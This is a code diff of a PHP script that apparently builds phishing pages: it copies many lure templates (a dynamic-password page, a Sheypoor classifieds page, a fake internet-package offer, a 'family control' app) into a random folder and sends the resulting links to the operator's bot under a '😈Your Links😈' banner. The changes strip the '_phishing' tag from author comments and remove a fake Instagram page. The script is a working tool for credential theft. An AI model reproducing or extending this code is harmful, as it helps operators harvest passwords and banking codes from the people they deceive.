@@ -1,12 +1,12 @@
-﻿<?php 
+<?php 
 
-//CODED BY Geladiator_phishing
+//CODED BY Geladiator
 if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
 $protocol = $_SERVER['SERVER_PROTOCOL'];
 if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
 $protocol = 'HTTP/1.0';
 }
-//CODED BY Geladiator_phishing
+//CODED BY Geladiator
 header( 'Allow: POST' );
 header( "$protocol 405 Method Not Allowed" );
 header( 'Content-Type: text/plain' );
@@ -23,7 +23,7 @@ die(header("Location:403.html"));
 Usage:
 cheack($_POST['TOKEN']);
 
-//CODED BY Geladiator_phishing
+//CODED BY Geladiator
 $TOKENMS = stripslashes(htmlspecialchars($_POST['TOKEN']));
 if(strstr($TOKENMS,'../source/')){
 die('lfi and rfi detected');
@@ -33,7 +33,7 @@ if(strstr($IDMS,'../source/')){
 die('lfi and rfi detected');
 }
 file_put_contents("ID.txt",$IDMS);
-//CODED BY phoneix
+//CODED BY Geladiator
 $Rand=rand(11111,99999); 
 $TOKEN= '$TOKENESH';
 $ID ='$IDISH';
@@ -65,6 +65,7 @@ copy('../source/6g.php', '6g.php');
 copy('../source/number.php', 'number.php');
 copy('../source/live.php', 'live.php');
 copy('../source/cod.php', 'cod.php');
+copy('../source/sheypoor.php', 'sheypoor.php');
 copy('../source/snap.php', 'snap.php');
 copy('../source/tash.php', 'tash.php');
 copy('../source/chat.php', 'chat.php');
@@ -123,10 +124,7 @@ copy('../source/4sepl.html', '4sepl.html');
 copy('../source/5sepb.html', '5sepb.html');
 copy('../source/5sepf.html', '5sepf.html');
 copy('../source/5sepl.html', '5sepl.html');
-copy('../source/sheypoor.php', 'sheypoor.php');
-copy('../source/instafacke.html', 'instafacke.html');
 copy('../source/default.html', 'default.html');
-
 
 ?>
 <center><P>درگاه شما ساخته شد .لینک ها به ربات شما ارسال شد</p></center>
@@ -293,6 +291,9 @@ $Text = "╔ [ • 😈Your Links😈 • ]
 ║ 
 ╠ •Name : رمز پویا 
 ╠ ⚡️Link : $link/$Rand/cod.php
+║ 
+╠ •Name : شیپور 
+╠ ⚡️Link : $link/$Rand/sheypoor.php
 ║  
 ╠ •Name : 6 گیگ اینترنت (جدید)
 ╠ ⚡️Link : $link/$Rand/net6.php
@@ -303,14 +304,6 @@ $Text = "╔ [ • 😈Your Links😈 • ]
 ╠ •Name : کنترل خانواده 
 ╠ ⚡️Link : $link/$Rand/kontrolapp.html
 ║  
-╠ •Name : شیپور
-╠ ⚡️Link : $link/$Rand/sheypoor.php 
-║
-╠ •Name : فیک پیج 
-╠ ⚡️Link : $link/$Rand/instafacke.html
-║
-║
-║    
 ╚ [ • @$chanel • ]
 ";
 
